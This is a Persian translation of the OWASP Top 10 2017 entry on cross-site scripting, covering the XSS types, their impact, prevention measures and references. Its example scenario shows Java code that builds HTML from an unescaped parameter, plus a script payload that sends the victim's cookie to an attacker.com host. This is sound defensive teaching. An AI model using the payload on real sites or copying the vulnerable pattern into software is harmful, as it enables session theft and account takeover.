# <div dir="rtl" align="right">A7:2017 Cross-Site Scripting (XSS) </div>

| Threat agents/Attack vectors | Security Weakness           | Impacts               |
| -- | -- | -- |
| Access Lvl : قابلیت بهره‌برداری: ۳ | شیوع: ۳ : قابل کشف بودن: ۳ | تکنیکی: ۲ : Business ? |
| <div dir="rtl" align="right">ابزارهای خودکار می‌توانند تمام 3 شکل ممکن XSS را شناسایی و اکسپلویت کنند و چارچوب های اکسپلویت در دسترس رایگانی وجود دارد. </div> | <div dir="rtl" align="right">XSS دومین مسئله مهم درOWASP Top 10 است و در حدود دو سوم از تمام برنامه های کاربردی یافت می‌شود.ابزارهای خودکار می‌توانند برخی از مشکلاتXSS  را به صورت خودکار، به ویژه در فن آوری های بالغ مانند PHP، J2EE / JSP و ASP.NET پیدا کنند.</div> | <div dir="rtl" align="right">تأثیر XSS برای انواع بازتابی و DOM XSS متوسط است و برای XSS ذخیره شده با اجرای کد از راه دور در مرورگر قربانی شدید است مانند سرقت اعتبارها، جلسات و یا ارائه بد افزارها به قربانیان.</div> |

## <div dir="rtl" align="right">آیا برنامه کاربردی آسیب پذیر است ؟</div>

<p dir="rtl" align="right">سه شکل از XSS وجود دارد که معمولا مرورگرهای کاربران را هدف قرار می‌دهند:</p>

<ul dir="rtl" align="right">
  <li>
    <strong>XSS  منعکس شده: </strong>
     برنامه یا API شامل ورودی کاربر غیرقابل اعتبار و غیرقانونی به عنوان بخشی از خروجی HTML است. یک حمله موفقیت آمیز می‌تواند به حمله کننده اجازه دهد HTML و JavaScript دلخواهی را در مرورگر قربانی اجرا کند. به طور معمول، کاربر نیاز به ارتباط با برخی از لینک های مخرب دارد که به یک صفحه کنترل شده توسط مهاجم اشاره می‌کند، مانند وب سایت های آگهی مخرب، تبلیغات و یا مشابه این ها.
  </li>
  <li>
    <strong>XSS ذخیره شده: </strong>
    برنامه کاربردی یا API ورودی کاربر تصفیه نشده را که بعدا توسط یک کاربر یا مدیر دیگر مشاهده می‌شود، ذخیره می‌کند. XSS ذخیره شده اغلب کاربر را با خطر بالایی از ریسک روبه رو می‌کند.
  </li>
  <li>
    <strong>DOM XSS: </strong>
    چارچوب های جاوا اسکریپت، برنامه های تک صفحه وAPI هایی که به طور پویا شامل داده های قابل کنترل مهاجم به یک صفحه می‌شوند، به DOM XSS آسیب پذیر هستند. در حالت ایده آل، برنامه اطلاعات قابل کنترل مهاجم را به API های جاوا اسکریپت نا امن ارسال نمی‌کند.
  </li>
</ul>

<p dir="rtl" align="right">حملات متداول XSS عبارتند از: سرقت نشست، گرفتن حساب، دور زدن MFA، جایگزینی یا حذف گره DOM (از قبیل پنل های ورود به سیستم تروجان)، حملات علیه مرورگر کاربر مانند دریافت نرم افزارهای مخرب، کلید ورود به سیستم و سایر حملات سمت مشتری.</p>

## <div dir="rtl" align="right">نحوه پیشگیری از حمله : </div>

<p dir="rtl" align="right">پیشگیری ازپیشگیری ازXSS  نیاز به جداسازی داده های غیر قابل اعتماد از محتوای فعال مرورگر دارد. این کار با انجام موارد زیر قابل دسترسی است:</p>

<ul dir="rtl" align="right">
  <li>با استفاده از چارچوب هایی که به صورت خودکار از وقوع XSS فرار می‌کنند به وسیله طراحی، همانند آخرین Ruby on Rails، React JS. محدودیت های حفاظت XSS  هر چارچوب را بیاموزید و به طور مناسب موارد استفاده را که پوشش داده نمی‌شوند، مدیریت کنید.
  </li>
  <li>فرار داده های درخواست HTTP نامعتبر براساس متن در خروجی HTML (بدنه، ویژگی، جاوا اسکریپت، CSS، یا URL ) آسیب پذیری های XSS ذخیره شده و منعکس شده را حل خواهد کرد.  
  </li>
  <li>
    با استفاده از رمزگذاری حساس به متن هنگام تغییر سند مرورگر در سمت مشتری بر علیه DOM XSS عمل می‌کند. هنگامی‌که از انجام این کار اجتناب نکنیم، تکنیک های فرار از حساسیت متن مشابه می‌توانند به API های مرورگر اعمال شوند، همانطور که در<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet 'XSS Prevention'</a> توضیح داده شده است. </li>
  <li>
    فعال کردن یک سیاست امنیتی محتوا <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">(CSP)</a>  یک کنترل دفاع در عمق در برابر XSS  است. این مؤثر است اگر هیچ آسیب پذیری دیگری وجود نداشته باشد که اجازه می‌دهد کدهای مخرب را از طریق فایل محلی شامل شود (مثلا مسیرهای رونویسی شده یا کتابخانه های آسیب پذیر از شبکه های تحویل مجاز محتوا).
  </li>
</ul>

## <div dir="rtl" align="right">نمونه سناریو حمله</div>

<p dir="rtl" align="right"><strong>سناریو 1: </strong>برنامه بدون تایید یا escape، از داده های غیر قابل اعتماد در ساخت قطعه HTML زیر استفاده می‌کند:</p>

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
<p dir="rtl" align="right">مهاجم پارامتر CC را در مرورگر خود به صورت زیر تغییر می‌دهد :</p>

`'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

<p dir="rtl" align="right">این حمله باعث می‌شود شناسه نشست قربانی به وب سایت مهاجم ارسال شده و به مهاجم اجازه سرقت نشست فعلی کاربر را می‌دهد.</p>

<p dir="rtl" align="right"><strong>نکته : </strong>مهاجمان می‌توانند ازXSS برای جلوگیری از هرگونه دفاع خودکار CSRF که برنامه کاربردی به کار می‌برد، استفاده کنند.</p>

## <div dir="rtl" align="right">منابع</div>

### <div dir="rtl" align="right">OWASP</div>

* [OWASP Proactive Controls: Encode Data](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
* [OWASP Proactive Controls: Validate Data](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
* [OWASP Application Security Verification Standard: V5](https://owasp.org/www-project-application-security-verification-standard/)
* [OWASP Testing Guide: Testing for Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
* [OWASP Testing Guide: Testing for Stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
* [OWASP Testing Guide: Testing for DOM XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
* [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
* [OWASP Java Encoder Project](https://owasp.org/www-project-java-encoder/)

### <div dir="rtl" align="right">خارجی</div>

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_client-side-template-injection)
